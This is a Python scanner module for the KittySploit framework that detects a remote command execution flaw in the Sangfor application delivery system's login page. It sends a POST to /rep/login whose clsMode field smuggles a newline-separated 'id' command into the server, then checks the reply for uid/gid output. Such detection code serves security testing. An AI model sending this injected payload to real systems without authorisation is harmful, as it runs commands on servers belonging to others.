#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Sangfor application delivery management system login has a remote command execution vulnerability, through whi."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Sangfor Application Login - Remote Command Execution Detection',
        'description': 'Sangfor application delivery management system login has a remote command execution vulnerability, through which an attacker can obtain server privileges and execute arbitrary commands',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'sangfor', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/sangfor-login-rce.yaml',
        ],
    }

    def run(self):
        path = '/rep/login'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='clsMode=cls_mode_login%0Aid%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('cluster_mode_others',)
        body_regexes = ('uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)',)
        if (any(m in body for m in body_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='critical', reason='Sangfor Application Login - Remote Command Execution detected', path=path)
            return True
        return False

